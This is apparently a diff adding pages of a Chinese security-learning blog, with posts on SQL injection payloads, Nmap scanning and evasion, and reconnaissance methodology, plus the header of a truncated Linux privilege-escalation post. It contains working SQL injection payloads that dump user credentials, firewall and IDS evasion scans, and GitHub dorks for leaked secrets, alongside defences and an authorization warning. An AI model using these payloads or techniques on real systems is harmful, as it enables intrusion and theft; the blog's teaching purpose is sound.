+<p>输入 <code>id=1 OR 1=1</code> 后，SQL 变成 <code>SELECT * FROM users WHERE id = 1 OR 1=1</code>，返回全部用户。</p>
+<h2 id="0x02-分类"><a href="#0x02-分类" class="headerlink" title="0x02 分类"></a>0x02 分类</h2><p>按注入点位置分：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>特征</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>回显注入</td>
+<td>结果直接返回页面</td>
+<td><code>union select</code></td>
+</tr>
+<tr>
+<td>报错注入</td>
+<td>利用数据库报错带出数据</td>
+<td><code>extractvalue</code>, <code>updatexml</code></td>
+</tr>
+<tr>
+<td>盲注</td>
+<td>无回显，靠布尔&#x2F;时间判断</td>
+<td><code>and sleep(5)</code></td>
+</tr>
+<tr>
+<td>二次注入</td>
+<td>数据先存入再触发</td>
+<td>注册处存 payload</td>
+</tr>
+</tbody></table>
+<h2 id="0x03-实战-Payload-集"><a href="#0x03-实战-Payload-集" class="headerlink" title="0x03 实战 Payload 集"></a>0x03 实战 Payload 集</h2><h3 id="1-联合查询注入-Union-based"><a href="#1-联合查询注入-Union-based" class="headerlink" title="1. 联合查询注入 (Union-based)"></a>1. 联合查询注入 (Union-based)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. 判断注入点</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="comment">-- </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 5 -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 2. 判列数 &amp; 找回显位</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 查库</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 -- </span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4. 查表</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 5. 查列</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 6. 查数据</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,0x3a,password),3 from users -- </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-报错注入-Error-based"><a href="#2-报错注入-Error-based" class="headerlink" title="2. 报错注入 (Error-based)"></a>2. 报错注入 (Error-based)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MySQL 5.1+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select user()),0x7e)) -- </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">-- </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3. 布尔盲注"></a>3. 布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and substr((select database()),1,1)=&#x27;</span>s<span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">-- </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4. 时间盲注"></a>4. 时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(substr((select database()),1,1)=&#x27;</span>s<span class="string">&#x27;,sleep(3),1) -- </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ol>
+<li><strong>参数化查询</strong>（最佳方案）：使用 PDO 预编译 &#x2F; MyBatis <code>#&#123;&#125;</code> &#x2F; Java PreparedStatement。</li>
+<li><strong>输入校验</strong>：白名单校验类型、长度。</li>
+<li><strong>最小权限</strong>：DB 账号只读 + 只能查指定库。</li>
+<li><strong>WAF</strong>：作为补充防线，不能替代代码层防御。</li>
+<li><strong>审计</strong>：对自研 ORM 重点 review。</li>
+</ol>
+<h2 id="0x05-工具推荐"><a href="#0x05-工具推荐" class="headerlink" title="0x05 工具推荐"></a>0x05 工具推荐</h2><ul>
+<li><strong>sqlmap</strong>：自动化注入神器，支持 6 大数据库</li>
+<li><strong>BurpSuite Intruder</strong>：手工测试 + 批量 fuzz</li>
+<li><strong>NoSQLi Scanner</strong>：NoSQL 注入场景</li>
+</ul>
+<h2 id="0x06-结语"><a href="#0x06-结语" class="headerlink" title="0x06 结语"></a>0x06 结语</h2><p>SQL 注入虽”老”，但每年仍有大量在野漏洞。理解原理 + 多看 Payload + 多打靶场（sqli-labs、DVWA），是掌握它的唯一路径。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/08/25/Nmap%E6%89%AB%E6%8F%8F%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/25/Nmap%E6%89%AB%E6%8F%8F%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">Nmap 扫描技巧总结</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-25 10:00:00" itemprop="dateCreated datePublished" datetime="2026-08-25T10:00:00+08:00">2026-08-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 17:28:41" itemprop="dateModified" datetime="2026-09-01T17:28:41+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">工具使用</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>593</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Nmap 是渗透测试中绕不开的神级扫描工具。本文梳理常用参数、扫描类型与绕过技巧，作为命令速查表使用。</p>
+<h2 id="0x01-基础语法"><a href="#0x01-基础语法" class="headerlink" title="0x01 基础语法"></a>0x01 基础语法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap [Scan Type] [Options] &lt;target&gt;</span><br><span class="line"><span class="comment"># target 可以是 IP、域名、CIDR、范围、列表文件</span></span><br><span class="line">nmap 192.168.1.0/24</span><br><span class="line">nmap 192.168.1.1-50</span><br><span class="line">nmap -iL targets.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-主机发现"><a href="#0x02-主机发现" class="headerlink" title="0x02 主机发现"></a>0x02 主机发现</h2><p>判断主机在线（不在线的不会做端口扫描）：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-sn</code></td>
+<td>只做主机发现，不扫端口</td>
+</tr>
+<tr>
+<td><code>-Pn</code></td>
+<td>跳过主机发现，强制扫描</td>
+</tr>
+<tr>
+<td><code>-PS80,443</code></td>
+<td>TCP SYN Ping 指定端口</td>
+</tr>
+<tr>
+<td><code>-PA80</code></td>
+<td>TCP ACK Ping</td>
+</tr>
+<tr>
+<td><code>-PE</code></td>
+<td>ICMP Echo Ping（容易被墙）</td>
+</tr>
+<tr>
+<td><code>-PU</code></td>
+<td>UDP Ping</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>不做 DNS 解析（加速）</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>内网做信息收集，<code>-sn</code> 摸清存活主机非常关键：<br><code>nmap -sn 192.168.1.0/24 -oG alive.txt</code></p>
+</blockquote>
+<h2 id="0x03-端口扫描类型"><a href="#0x03-端口扫描类型" class="headerlink" title="0x03 端口扫描类型"></a>0x03 端口扫描类型</h2><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>类型</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-sS</code></td>
+<td>SYN 半开扫描</td>
+<td>默认且最快，需 root</td>
+</tr>
+<tr>
+<td><code>-sT</code></td>
+<td>TCP 全连接</td>
+<td>不需 root，但日志多</td>
+</tr>
+<tr>
+<td><code>-sU</code></td>
+<td>UDP 扫描</td>
+<td>慢，常用 <code>--top-ports 100</code></td>
+</tr>
+<tr>
+<td><code>-sA</code></td>
+<td>ACK 扫描</td>
+<td>测防火墙规则</td>
+</tr>
+<tr>
+<td><code>-sF / -sX / -sN</code></td>
+<td>FIN&#x2F;Xmas&#x2F;Null</td>
+<td>绕过部分无状态防火墙</td>
+</tr>
+</tbody></table>
+<h2 id="0x04-常用实战组合"><a href="#0x04-常用实战组合" class="headerlink" title="0x04 常用实战组合"></a>0x04 常用实战组合</h2><h3 id="1-快速扫常见端口"><a href="#1-快速扫常见端口" class="headerlink" title="1. 快速扫常见端口"></a>1. 快速扫常见端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS --top-ports 1000 -T4 -n --open 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-全端口-服务识别"><a href="#2-全端口-服务识别" class="headerlink" title="2. 全端口 + 服务识别"></a>2. 全端口 + 服务识别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- -sV -A -T4 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-p-</code> 全 65535 端口</li>
+<li><code>-sV</code> 服务版本</li>
+<li><code>-A</code> 综合探测（OS、脚本、Trace）</li>
+<li><code>-T4</code> 加速时序</li>
+</ul>
+<h3 id="3-脚本引擎-NSE"><a href="#3-脚本引擎-NSE" class="headerlink" title="3. 脚本引擎 NSE"></a>3. 脚本引擎 NSE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 漏洞检测</span></span><br><span class="line">nmap --script vuln 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># SMB 信息</span></span><br><span class="line">nmap --script smb-enum-shares,smb-os-discovery -p 445 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL 空口令</span></span><br><span class="line">nmap --script mysql-empty-password -p 3306 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTP 标题</span></span><br><span class="line">nmap --script http-title -p 80,443 192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主机发现的 NSE 全家桶</span></span><br><span class="line">nmap --script=banner,nbstat,smb-os-discovery -p 139,445 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-输出报告"><a href="#4-输出报告" class="headerlink" title="4. 输出报告"></a>4. 输出报告</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- -oN result.txt -oX result.xml -oG result.gnmap 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-oN</code> 人类可读</li>
+<li><code>-oX</code> XML（导入其他工具）</li>
+<li><code>-oG</code> grep 友好</li>
+<li><code>-oA all</code> 三种格式同时输出</li>
+</ul>
+<h2 id="0x05-防火墙-IDS-绕过"><a href="#0x05-防火墙-IDS-绕过" class="headerlink" title="0x05 防火墙 &#x2F; IDS 绕过"></a>0x05 防火墙 &#x2F; IDS 绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分片报文</span></span><br><span class="line">nmap -sS -f 192.168.1.1</span><br><span class="line"><span class="comment"># 双重分片</span></span><br><span class="line">nmap -sS -ff 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 源端口欺骗</span></span><br><span class="line">nmap -sS --source-port 53 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># MAC 欺骗</span></span><br><span class="line">nmap -sS --spoof-mac 0 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时序慢扫</span></span><br><span class="line">nmap -sS -T0 -p- 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 诱饵</span></span><br><span class="line">nmap -sS -D RND:10 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-性能与加速技巧"><a href="#0x06-性能与加速技巧" class="headerlink" title="0x06 性能与加速技巧"></a>0x06 性能与加速技巧</h2><ul>
+<li><code>-T0~5</code>：时序模板，0 最慢最隐蔽，5 最快最吵闹</li>
+<li><code>--min-rate 1000</code>：最低发包速率</li>
+<li><code>--max-retries 2</code>：重试上限</li>
+<li><code>--host-timeout 30m</code>：单主机超时</li>
+<li><code>-n</code>：不做 DNS 反查，加速 5-10 倍</li>
+</ul>
+<h2 id="0x07-学习建议"><a href="#0x07-学习建议" class="headerlink" title="0x07 学习建议"></a>0x07 学习建议</h2><ul>
+<li>官方文档 <a target="_blank" rel="noopener" href="https://nmap.org/book/">nmap.org&#x2F;book</a> 是唯一权威</li>
+<li>搭建本地靶场：Metasploitable2、Vulnhub</li>
+<li>多看 NSE 脚本，自己改一份</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/08/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E8%AE%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E6%B3%95%E8%AE%BA/" class="post-title-link" itemprop="url">渗透测试信息收集方法论</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-20 09:30:00" itemprop="dateCreated datePublished" datetime="2026-08-20T09:30:00+08:00">2026-08-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 17:29:04" itemprop="dateModified" datetime="2026-09-01T17:29:04+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>549</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>“渗透的本质是信息收集。” ——TK 教主</p>
+</blockquote>
+<p>信息收集占整个渗透测试 60-70% 的时间，质量直接决定后续打点的效率。本文梳理一份完整的方法论与工具清单。</p>
+<h2 id="一、企业资产测绘"><a href="#一、企业资产测绘" class="headerlink" title="一、企业资产测绘"></a>一、企业资产测绘</h2><h3 id="1-1-工商信息"><a href="#1-1-工商信息" class="headerlink" title="1.1 工商信息"></a>1.1 工商信息</h3><ul>
+<li>企查查、天眼查、爱企查：拿全母公司、子公司、控股关系</li>
+<li>国家企业信用信息公示系统：最权威</li>
+</ul>
+<h3 id="1-2-ICP-备案"><a href="#1-2-ICP-备案" class="headerlink" title="1.2 ICP 备案"></a>1.2 ICP 备案</h3><ul>
+<li>工信部 ICP 备案查询：<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">beian.miit.gov.cn</a></li>
+<li>站长之家、爱站：批量查同一备案号的资产</li>
+</ul>
+<h3 id="1-3-子域名"><a href="#1-3-子域名" class="headerlink" title="1.3 子域名"></a>1.3 子域名</h3><p>工具全家桶：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 被动：从公开数据源拿</span></span><br><span class="line">subfinder -d target.com -o subs.txt</span><br><span class="line">croc -d target.com --silent</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主动：DNS 爆破</span></span><br><span class="line">amass enum -d target.com -o amass.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 证书透明日志</span></span><br><span class="line">curl -s <span class="string">&quot;https://crt.sh/?q=%25.target.com&amp;output=json&quot;</span> | jq -r <span class="string">&#x27;.[].name_value&#x27;</span> | <span class="built_in">sort</span> -u</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-IP-段-C-段"><a href="#1-4-IP-段-C-段" class="headerlink" title="1.4 IP 段 &amp; C 段"></a>1.4 IP 段 &amp; C 段</h3><ul>
+<li>Whois：<code>whois 1.2.3.4</code> 拿 AS 号与网段</li>
+<li>Censys &#x2F; Shodan &#x2F; Fofa &#x2F; ZoomEye：反向查找</li>
+<li>各厂 IDC：阿里云、腾讯云 IP 段白名单</li>
+</ul>
+<h2 id="二、Web-资产发现"><a href="#二、Web-资产发现" class="headerlink" title="二、Web 资产发现"></a>二、Web 资产发现</h2><h3 id="2-1-端口扫描"><a href="#2-1-端口扫描" class="headerlink" title="2.1 端口扫描"></a>2.1 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大范围快速扫</span></span><br><span class="line">masscan -p1-65535 1.2.3.0/24 --rate=10000 -oJ ports.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存活端口的指纹识别</span></span><br><span class="line">nmap -sV -p 80,443,8080,8443 -iL targets.txt --open</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Web-指纹"><a href="#2-2-Web-指纹" class="headerlink" title="2.2 Web 指纹"></a>2.2 Web 指纹</h3><ul>
+<li><strong>Wappalyzer</strong> 浏览器插件：一键看技术栈</li>
+<li><strong>httpx</strong>：批量 HTTP 探活 + 标题 + 状态码 + 指纹</li>
+<li><strong>fingerprinthub</strong> &#x2F; <strong>EHole</strong>：国内指纹库</li>
+<li><strong>Gobuster</strong> &#x2F; <strong>ffuf</strong>：目录爆破</li>
+</ul>
+<h3 id="2-3-搜索引擎语法"><a href="#2-3-搜索引擎语法" class="headerlink" title="2.3 搜索引擎语法"></a>2.3 搜索引擎语法</h3><table>
+<thead>
+<tr>
+<th>引擎</th>
+<th>语法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Google</td>
+<td><code>site:target.com intitle:&quot;管理后台&quot;</code></td>
+</tr>
+<tr>
+<td>Fofa</td>
+<td><code>domain=&quot;target.com&quot;</code></td>
+</tr>
+<tr>
+<td>Shodan</td>
+<td><code>hostname:target.com port:&quot;3389&quot;</code></td>
+</tr>
+<tr>
+<td>ZoomEye</td>
+<td><code>site:target.com</code></td>
+</tr>
+<tr>
+<td>Censys</td>
+<td><code>services.port=443 AND services.tls.certificates.leaf_data.subject.common_name=&quot;target.com&quot;</code></td>
+</tr>
+<tr>
+<td>Quake</td>
+<td><code>domain:&quot;target.com&quot;</code></td>
+</tr>
+</tbody></table>
+<h2 id="三、Github-代码泄露"><a href="#三、Github-代码泄露" class="headerlink" title="三、Github &amp; 代码泄露"></a>三、Github &amp; 代码泄露</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用 gitrob / trufflehog 自动化扫</span></span><br><span class="line">trufflehog github --org=target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手工 dork</span></span><br><span class="line"><span class="string">&quot;target.com&quot;</span> password</span><br><span class="line"><span class="string">&quot;target.com&quot;</span> smtp</span><br><span class="line"><span class="string">&quot;target.com&quot;</span> api_key</span><br><span class="line"><span class="string">&quot;target.com&quot;</span> jdbc:mysql</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、人员与社工"><a href="#四、人员与社工" class="headerlink" title="四、人员与社工"></a>四、人员与社工</h2><ul>
+<li>LinkedIn &#x2F; 脉脉：找员工</li>
+<li>Github：员工 ID、提交邮箱</li>
+<li>邮箱格式推断：<code>firstname.lastname@target.com</code></li>
+</ul>
+<h2 id="五、SaaS-云资产"><a href="#五、SaaS-云资产" class="headerlink" title="五、SaaS &#x2F; 云资产"></a>五、SaaS &#x2F; 云资产</h2><ul>
+<li>子域 CNAME 指向云：[Takeover 漏洞] 重点</li>
+<li>S3 Bucket 翻找：<code>s3://target-backups/</code></li>
+</ul>
+<h2 id="六、信息整理"><a href="#六、信息整理" class="headerlink" title="六、信息整理"></a>六、信息整理</h2><p>最终产出三张表：</p>
+<ol>
+<li><strong>资产表</strong>：IP&#x2F;域名&#x2F;端口&#x2F;服务&#x2F;版本&#x2F;标题</li>
+<li><strong>漏洞清单</strong>：CVE 编号 + 状态 + 优先级</li>
+<li><strong>攻击路径图</strong>：内网横向起点 → 终点</li>
+</ol>
+<blockquote>
+<p>一份整理良好的信息收集文档，就是渗透报告的 80%。</p>
+</blockquote>
+<h2 id="七、合规与法律边界"><a href="#七、合规与法律边界" class="headerlink" title="七、合规与法律边界"></a>七、合规与法律边界</h2><p>仅对<strong>授权</strong>目标进行测试。任何未授权的扫描 &#x2F; 探测均属于违法行为，请勿越界。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/08/15/Linux%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/15/Linux%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">Linux 提权思路整理</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-15 16:00:00" itemprop="dateCreated datePublished" datetime="2026-08-15T16:00:00+08:00">2026-08-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
